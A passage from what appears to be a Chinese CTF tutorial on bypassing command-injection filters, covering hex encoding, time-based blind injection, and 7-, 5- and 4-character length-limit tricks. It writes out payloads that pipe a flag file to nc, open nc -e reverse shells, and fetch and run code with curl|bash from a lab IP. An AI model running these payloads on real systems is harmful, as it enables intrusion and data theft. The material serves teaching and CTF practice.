title="3.HEX编码"></a><strong>3.HEX编码</strong></h4><p>ASCII码</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs coq">import binascii<br>s = b<span class="hljs-string">&quot;tac flag&quot;</span><br>h = binascii.b2a_hex(s)<br>print(h)<br><br>tac flag.php -&gt; <span class="hljs-number">74616320666</span>c61672e706870<br><br>执行命令<br>#echo <span class="hljs-string">&quot;74616320666c61672e706870&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span><br>xxd：二进制显示和处理文件工具<br>-r -p：将纯十六进制转储的反向输出打印为了ascll格式<br>bash也可换成sh、/bin/bash、反引号<br><br>payload:<br>?cmd=passthru(&#x27;echo <span class="hljs-string">&quot;74616320666c61672e706870&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">bash</span>&#x27;);<br></code></pre></td></tr></table></figure><h4 id="4-shellcode编码"><a href="#4-shellcode编码" class="headerlink" title="4.shellcode编码"></a>4.shellcode编码</h4><p>16进制的机器码</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">将<span class="hljs-keyword">ascii</span>码前加\<span class="hljs-keyword">x</span><br>用<span class="hljs-keyword">print</span>打印 <span class="hljs-comment">//echo 无法执行</span><br>?cmd=passthru(<span class="hljs-string">&quot;print&#x27;shellcode编码&#x27;|bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-31.png"></p><p>反引号、$()都可</p><h2 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h2><h3 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h3><p>页面无法shell反弹或者无法回显，或者没有写入权限，可尝试命令盲注。</p><p>根据返回的时间来进行判断;</p><p>读取文件指定行的指定位置的字符;</p><p>if判断语句</p><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a><strong>相关命令</strong></h3><p><strong>1.sleep</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">sleep</span> 5</span><br>5秒之后返回结果<br></code></pre></td></tr></table></figure><p><strong>2.awk NR</strong></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">#cat flag<br>hello<br>Flag&#123;succss!!&#125;<br></code></pre></td></tr></table></figure><p><strong>cat+awk NR逐行获取数据</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==1</span><br>hello<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2</span><br>Flag&#123;succss!!&#125;<br></code></pre></td></tr></table></figure><p><strong>3.cut -c</strong></p><p><strong>cut命令逐列获取单个字符</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1</span><br>F<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 2</span><br>l<br></code></pre></td></tr></table></figure><p><strong>4.if语句判断命令是否执行</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == F];<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;right&quot;</span>;<span class="hljs-keyword">fi</span></span><br>right<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag | awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == a];<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;right!&quot;</span>;<span class="hljs-keyword">fi</span></span><br></code></pre></td></tr></table></figure><p>if[]里的判断语句为真，则执行echo”right”; 否则执行fi结束</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">if</span> [$(<span class="hljs-built_in">cat</span> flag |awk NR==2 | <span class="hljs-built_in">cut</span> -c 1) == F];<span class="hljs-keyword">then</span> <span class="hljs-built_in">sleep</span> 2;<span class="hljs-keyword">fi</span></span><br></code></pre></td></tr></table></figure><p>if[]里的判断语句为真，则执行sleep 2，休眠2秒后返回结果</p><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p><strong><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-32.png"></strong></p><h2 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h2><h3 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="符号和-符号"><a href="#符号和-符号" class="headerlink" title="&gt;符号和&gt;&gt;符号"></a>&gt;符号和&gt;&gt;符号</h4><p>1.通过&gt;来创建文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#echo benben &gt; a</span><br>创建文件<span class="hljs-keyword">a</span>，并把字符串<span class="hljs-string">&quot;benben&quot;</span>写入到文件<span class="hljs-keyword">a</span>里<br></code></pre></td></tr></table></figure><p>通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#echo</span> <span class="hljs-selector-tag">dazhuang</span> &gt; <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>2.通过&gt;&gt;来追加内容</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#echo</span> benben &gt;&gt; <span class="hljs-selector-tag">a</span><br>在原本文件内容后面追加<span class="hljs-string">&quot;benben&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">#&gt; <span class="hljs-selector-tag">b</span><br>直接创建文件<span class="hljs-selector-tag">b</span>，类似touch <span class="hljs-selector-tag">b</span><br></code></pre></td></tr></table></figure><h4 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h4><p>在没有写完的命令后面加”\“，可以将一条1命令写在多行</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#cat</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#c</span>\<br><span class="hljs-selector-tag">a</span>\<br><span class="hljs-selector-tag">t</span> \<br><span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>相当于\把换行的命令连接到一起执行</p><h4 id="ls-t命令"><a href="#ls-t命令" class="headerlink" title="ls -t命令"></a>ls -t命令</h4><p>将文件名按照时间顺序排列出来（后创建的排在前面）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ls</span><br><span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">c</span><br>按字母顺序显示文件名<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#ls</span> <span class="hljs-selector-tag">-t</span><br><span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">c</span> <span class="hljs-selector-tag">a</span><br>按时间顺序显示文件名<br>（后创建的排在前面）<br></code></pre></td></tr></table></figure><p>注意：只能精确到秒</p><p>组合运用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;ag</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;fl</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;<span class="hljs-string">&quot;t &quot;</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">&gt;<span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span> -t</span><br>ca &#x27;t &#x27; fl ag<br></code></pre></td></tr></table></figure><p>按时间顺序反向依次创建文件</p><p>“ca” “t “ “fl” “ag”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">ls</span> -t &gt; x</span><br></code></pre></td></tr></table></figure><p>创建文件x，并把’ls -t’执行结果写入文件x里</p><h4 id="组合运用"><a href="#组合运用" class="headerlink" title="组合运用"></a>组合运用</h4><p><strong>ls -t 命令列出文件名，然后每个文件名按行储存</strong></p><p><strong>在创建文件时，假如”\“，把命令”ca” “t “ “fl” “ag”连接起来</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">#&gt;ag<br>#&gt;fl\\<br>#&gt;<span class="hljs-string">&quot;t \\&quot;</span><br>#&gt;ca\\<br>#ls -t &gt; a<br></code></pre></td></tr></table></figure><p><strong>\\前面的\把后面的\实体化变成字符</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#cat a</span><br>a<br>ca<span class="hljs-string">\</span><br>t <span class="hljs-string">\</span><br>fl<span class="hljs-string">\</span><br>ag<br>flag<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#sh</span> <span class="hljs-selector-tag">a</span><br>#. <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-id">#zsh</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p>sh命令是shell命令语言解释器</p><p>执行命令从标准输入读取或从一个文件中读取</p><hr><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>对命令有长度限制时</strong></p><p><strong>把一些很短的文件名拼接成可执行命令</strong></p><p><strong>步骤：</strong></p><ul><li><strong>创建很短的文件名</strong></li><li><strong>ls -t按时间顺序列出文件名，按行储存</strong></li><li><strong>\连接换行命令</strong></li><li><strong>sh从文件中读取命令</strong></li></ul><h4 id="dir及-和rev"><a href="#dir及-和rev" class="headerlink" title="dir及 *和rev"></a>dir及 *和rev</h4><p><strong>dir:基本和ls一样，但有两个好处：</strong></p><p>一是开头字母是d，这使得它在alphabetical序中靠前</p><p>二是按列输出，不换行</p><p>*<em>*：相当于$(dir <em>)</em></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#dir *</span><br><span class="hljs-built_in">echo</span> ffff<br></code></pre></td></tr></table></figure><p>这里echo改成cat可以直接查看文件的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#$(dir *)</span><br>ffff$(<span class="hljs-built_in">echo</span> ffff)<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#*</span><br>ffff<br></code></pre></td></tr></table></figure><p><strong>如果第一个文件名是命令的话就会执行命令，</strong></p><p><strong>返回执行的结果，之后的文件名作为参数传入</strong></p><hr><p><strong>rev：可以反转文件每一行的内容</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag</span><br>12345<br>67890<br><span class="hljs-meta prompt_"># </span><span class="language-bash">rev flag</span><br>54321<br>09876<br></code></pre></td></tr></table></figure><h3 id="长度为7绕过方法解析"><a href="#长度为7绕过方法解析" class="headerlink" title="长度为7绕过方法解析"></a>长度为7绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-33.png"></p><p>期望执行的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">cat</span> flag|nc 192.168.1.161 7777</span><br></code></pre></td></tr></table></figure><p>kali的ip地址192.168.1.161</p><p>监听端口7777</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">监听方法：</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-lvp</span> <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>cat flag展示内容，再通过nc反弹提交到192.168.1.161:7777</p><p>拼接的步骤：</p><ul><li>&gt;创建很短的的文件名</li><li>ls -t按时间顺序列出文件名，按行储存</li><li>\连接换行命令</li><li>sh从文件中读取命令</li></ul><p><strong>步骤一：创建文件</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-34.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-35.png"></p><p><strong>步骤二：将文件名按顺序写入到文件</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> -t&gt;a</span><br></code></pre></td></tr></table></figure><p><strong>步骤三：执行脚本</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=sh a<br></code></pre></td></tr></table></figure><p><strong>python脚本：</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-36.png"></p><p><strong>nc反弹shell</strong></p><p><strong>在 Kali Linux 上监听连接</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -lvp <span class="hljs-tag">&lt;<span class="hljs-name">监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p> <strong>在目标主机上发起连接请求</strong></p><p>linux</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -e /bin/bash <span class="hljs-tag">&lt;<span class="hljs-name">kali的IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">kali监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>windows</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -e cmd.exe <span class="hljs-tag">&lt;<span class="hljs-name">kali的IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">kali监听端口</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="长度为5绕过方法解析"><a href="#长度为5绕过方法解析" class="headerlink" title="长度为5绕过方法解析"></a>长度为5绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-37.png"></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ls -t&gt;a<br>字符串长度为<span class="hljs-number">7</span>，超过限制<span class="hljs-number">5</span><br><br>&gt;<span class="hljs-string">\</span> <span class="hljs-string">\\</span><br>构造空格的字符串长度最少为<span class="hljs-number">5</span>，超过一个空格便无法构造<br><br>长度限制为<span class="hljs-number">7</span>时的命令不再适用<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-38.png"></p><p><strong>构建命令</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">期望执行的命令<br>curl <span class="hljs-number">192.168</span>.<span class="hljs-number">1.161</span><span class="hljs-string">|bash</span><br></code></pre></td></tr></table></figure><p><strong>步骤一</strong>：构造ls-t&gt;y</p><p>ls默认排序无法正常排出“ls\”””“-t”“&gt;y”</p><p>“ls”默认会排在最后，无法正常执行命令的</p><p>所以：我们先创建文件ls\</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-built_in">ls</span>\</span><br></code></pre></td></tr></table></figure><p>在创建文件”_”，并把“ls\”写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;_<br></code></pre></td></tr></table></figure><p>再创建其他文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&gt;<span class="hljs-string">\</span> <span class="hljs-string">\\</span><br>&gt;-t<span class="hljs-string">\\</span><br>&gt;<span class="hljs-string">\&gt;y</span><br></code></pre></td></tr></table></figure><p>用&gt;&gt;把所有文件名追加到文件_</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;&gt;_<br></code></pre></td></tr></table></figure><p>最后sh_执行文件_中的内容，即创建文件y</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sh_<br></code></pre></td></tr></table></figure><p><strong>步骤二：</strong>分解命令，创建文件</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-40.png"></p><p><strong>步骤三</strong>：执行脚本sh</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sh <span class="hljs-attribute">y</span><br></code></pre></td></tr></table></figure><p>执行命令curl 192.168.1.161|bash</p><p>反弹shell</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-41.png"></p><p>python脚本</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-42.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-43.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-44.png"></p><h3 id="长度为4绕过方法解析"><a href="#长度为4绕过方法解析" class="headerlink" title="长度为4绕过方法解析"></a>长度为4绕过方法解析</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-45.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>&gt;&gt;_<br></code></pre></td></tr></table></figure><p>追加命令长度最少为5，超过4个，不再适用</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-46.png"></p><p><strong>步骤一：构造ls -t&gt;g</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;g\&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;t-***</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;sl</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;<span class="hljs-built_in">dir</span></span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&#x27;g&gt;&#x27;</span> <span class="hljs-built_in">sl</span> t-<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># *</span><br>g&gt; <span class="hljs-built_in">sl</span> t-<br></code></pre></td></tr></table></figure><p>按字母排序但是顺序不满足</p><p>可以在-t后面加h，不影响命令执行，但是可以改变排序</p><p>在第二步创建的时候创建</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># &gt;ht-</span><br></code></pre></td></tr></table></figure><p>这样就能实现顺序正确</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&#x27;g&gt;&#x27;</span> ht- <span class="hljs-built_in">sl</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># *</span><br>g&gt; ht- <span class="hljs-built_in">sl</span><br></code></pre></td></tr></table></figure><p><strong>然后：</strong>将*的执行内容写入v中</p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">*&gt;v</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> v</span><br><span class="hljs-meta prompt_">g&gt; </span><span class="language-bash">ht- sl</span><br></code></pre></td></tr></table></figure><p>倒序排列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># rev v</span><br><span class="hljs-built_in">ls</span> -th &gt;g<br></code></pre></td></tr></table></figure><p>先创建一个rev，因为直接rev v要5个字符超过4个了，这里*v就相当于rev v</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &gt;rev</span><br><span class="hljs-comment"># *v&gt;x</span><br><span class="hljs-comment"># cat x</span><br><span class="hljs-built_in">ls</span> -th &gt;g<br></code></pre></td></tr></table></figure><p>*<strong>v&gt;x解释：</strong></p><p><strong>此处*为通配符，前能匹配rev，后可执行v</strong></p><hr><p>x文件中的内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">x</span>:<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">th</span> &gt;g<br></code></pre></td></tr></table></figure><p>完整构造步骤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">;\g</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">g\&gt;</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">ht-</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">sl</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-built_in">dir</span></span><br>*&gt;v<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">rev</span><br>*v&gt;x<br></code></pre></td></tr></table></figure><p><strong>为了防止”g”后面有其他文件名造成影响，可以多创建一个文件”;\g”，</strong></p><p><strong>用”;”阻断后面字符的影响</strong></p><p><strong>步骤二：构造一个反弹shell</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">192.168.1.161</span>|bash十进制<span class="hljs-number">192.168.1.161</span><br><span class="hljs-attribute">curl</span> <span class="hljs-number">0</span>xC0A801A1|bash十六进制<span class="hljs-number">0</span>xC0A801A1<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-48.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl <span class="hljs-number">0xC0A801A1</span>|bash<br>?<span class="hljs-function"><span class="hljs-params">cmd</span>=&gt;</span>sh x<br>?<span class="hljs-function"><span class="hljs-params">cmd</span>=&gt;</span>sh g<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-47.png"></p><p><strong>步骤三：反弹回来的shell查看flag</strong></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-49.png"></p><h2 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h2><h3 id="HTTP-请求头绕过（php-7-3）"><a href="#HTTP-请求头绕过（php-7-3）" class="headerlink" title="HTTP 请求头绕过（php 7.3）"></a>HTTP 请求头绕过（php 7.3）</h3><p>例题：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-50.png"></p><p>解析：</p><p> <img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-51.png"></p><p>​<img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-52.png"></p><p>所以这里只能提交函数，且函数内不能有参数</p><h4 id="HTTP-请求标头"><a href="#HTTP-请求标头" class="headerlink" title="HTTP 请求标头"></a>HTTP 请求标头</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getallheaders</span><span class="hljs-params">()</span></span>获取所有HTTP请求标头<br></code></pre></td></tr></table></figure><p>单独使用无法回显执行结果</p><p>所以配合print_r()函数使用</p><p><strong>在burpsuite中修改</strong></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">print_r</span>(<span 